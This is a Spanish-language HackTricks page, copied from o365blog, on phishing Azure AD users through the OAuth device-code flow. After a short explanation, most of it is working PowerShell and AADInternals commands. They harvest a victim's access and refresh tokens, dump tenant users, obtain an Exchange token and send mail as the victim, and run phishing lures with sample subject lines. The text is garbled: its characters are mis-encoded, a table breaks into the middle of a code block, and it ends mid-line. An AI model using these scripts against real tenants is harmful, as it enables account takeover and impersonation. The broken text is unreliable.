# Az - Phishing de autenticaci贸n de c贸digo de dispositivo

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

**Este post fue copiado de** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)

### 驴Qu茅 es la autenticaci贸n de c贸digo de dispositivo? <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Seg煤n la [documentaci贸n](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) de Microsoft, la autenticaci贸n de c贸digo de dispositivo:

> permite a los usuarios iniciar sesi贸n en dispositivos con restricciones de entrada, como un televisor inteligente, un dispositivo IoT o una impresora. Para habilitar este flujo, el dispositivo hace que el usuario visite una p谩gina web en su navegador en otro dispositivo para iniciar sesi贸n. Una vez que el usuario inicia sesi贸n, el dispositivo puede obtener tokens de acceso y tokens de actualizaci贸n seg煤n sea necesario.

El proceso es el siguiente:

1. Un usuario inicia una aplicaci贸n que admite el flujo de c贸digo de dispositivo en un dispositivo.
2. La aplicaci贸n se conecta al punto final /devicecode de Azure AD y env铆a **client\_id** y **resource**.
3. Azure AD env铆a de vuelta **device\_code**, **user\_code** y **verification\_url**.
4. El dispositivo muestra la **verification\_url** (hxxps://microsoft.com/devicelogin) y el **user\_code** al usuario.
5. El usuario abre un navegador y navega hasta **verification\_url**, proporciona el **user\_code** cuando se le solicita e inicia sesi贸n.
6. El dispositivo sondea a Azure AD hasta que despu茅s de un inicio de sesi贸n exitoso obtiene **access\_token** y **refresh\_token**.

![Flujo de c贸digo de dispositivo](https://o365blog.com/images/posts/phishing\_5.png)

### Phishing con autenticaci贸n de c贸digo de dispositivo <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

La idea b谩sica para utilizar la autenticaci贸n de c贸digo de dispositivo para phishing es la siguiente.

1. Un atacante se conecta al punto final /devicecode y env铆a **client\_id** y **resource**.
2. Despu茅s de recibir **verification\_uri** y **user\_code**, crea un correo electr贸nico que contenga un enlace a **verification\_uri** y **user\_code**, y lo env铆a a la v铆ctima.
3. La v铆ctima hace clic en el enlace, proporciona el c贸digo y completa el inicio de sesi贸n.
4. El atacante recibe **access\_token** y **refresh\_token** y ahora puede imitar a la v铆ctima.

#### 1. Conexi贸n al punto final /devicecode <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

El primer paso es hacer un POST http al punto final de c贸digo de dispositivo de Azure AD:

```
 https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```

Estoy usando los siguientes par谩metros. Eleg铆 usar el client\_id de "Microsoft Office" porque parece el nombre de la aplicaci贸n m谩s leg铆timo, y tambi茅n se puede usar para acceder a otros recursos. El recurso elegido da acceso a la API de gr谩ficos de AAD que es utilizada por el m贸dulo PowerShell de MSOnline.

| Par谩metro  | Valor                                                   |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
|
# Crear cuerpo para solicitudes de autenticaci贸n

$body=@{
	"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
	"code" =       $authResponse.device_code
	"resource" =   "https://graph.windows.net"
}

# Bucle mientras la autorizaci贸n est谩 pendiente o hasta que se exceda el tiempo de espera

while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "Se ha producido un tiempo de espera"
		return
	}
				
	# Intentar obtener la respuesta. Devolver谩 40x mientras est茅 pendiente, por lo que necesitamos intentar y capturar

	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# Este es el flujo normal, siempre devuelve 40x a menos que tenga 茅xito

		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		Write-Host $details.error

		if(!$continue)
		{
			# No est谩 pendiente, por lo que este es un error real

			Write-Error $details.error_description
			return
		}
	}

	# Si obtenemos una respuesta, todo est谩 bien!

	if($response)
	{
		break # Salir del bucle

	}
}
```

Ahora podemos usar el token de acceso para suplantar al usuario:

```powershell
# Volcar los usuarios del inquilino en csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```

Tambi茅n podemos obtener tokens de acceso para otros servicios utilizando el token de actualizaci贸n siempre que el client\_id siga siendo el mismo.

El siguiente script obtiene un token de acceso para Exchange Online.

```powershell
# Crear cuerpo para obtener token de acceso para Exchange Online

$body=@{
	"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" =    "refresh_token"
	"scope" =         "openid"
	"resource" =      "https://outlook.office365.com"
	"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Enviar correo electr贸nico como la v铆ctima

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "otra.victima@objetivo.org" -Subject "Pago vencido" -Message "Paga esto <h2>lo antes posible!</h2>"
```

## Uso de AADInternals para phishing <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals (v0.4.4 o posterior) tiene una funci贸n [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) que automatiza el proceso de phishing.

El mensaje de phishing se puede personalizar, el mensaje predeterminado es el siguiente:

```
'<div>隆Hola!<br/>Este es un mensaje enviado por alguien que est谩 utilizando la funci贸n de phishing de <a href="https://o365blog.com/aadinternals">AADInternals</a>. <br/><br/>Aqu铆 hay un <a href="{1}">enlace</a> al que <b>no debes hacer clic</b>.<br/><br/>Si a煤n decides hacerlo, proporciona el siguiente c贸digo cuando se solicite: <b>{0}</b>.</div>'
```

Mensaje predeterminado en el correo electr贸nico:\
![Correo electr贸nico de phishing](https://o365blog.com/images/posts/phishing\_11.png)

Mensaje predeterminado en Teams:\
![Mensaje de phishing](https://o365blog.com/images/posts/phishing\_12.png)

### Correo electr贸nico <a href="#email" id="email"></a>

El siguiente ejemplo env铆a un correo electr贸nico de phishing utilizando un mensaje personalizado. Los tokens se guardan en la cach茅.

```powershell
# Crear un mensaje personalizado

$message = '<html>隆Hola!<br/>Aqu铆 est谩 el enlace al <a href="{1}">documento</a>. Utiliza el siguiente c贸digo para acceder: <b>{0}</b>.</html>'

# Enviar un correo electr贸nico de phishing a los destinatarios utilizando un mensaje personalizado y guardar los tokens en cach茅

Invoke-AADPhishing -Recipients "victima@empresa.com","victima2@empresa.com" -Subject "Johnny comparti贸 un documento contigo" -Sender "Johnny Carson <jc@algundonde.com>" -SMTPServer smtp.miservidor.local -Message $message -SaveToCache 
```

```
C贸digo: CKDZ2BURF
Correo electr贸nico enviado a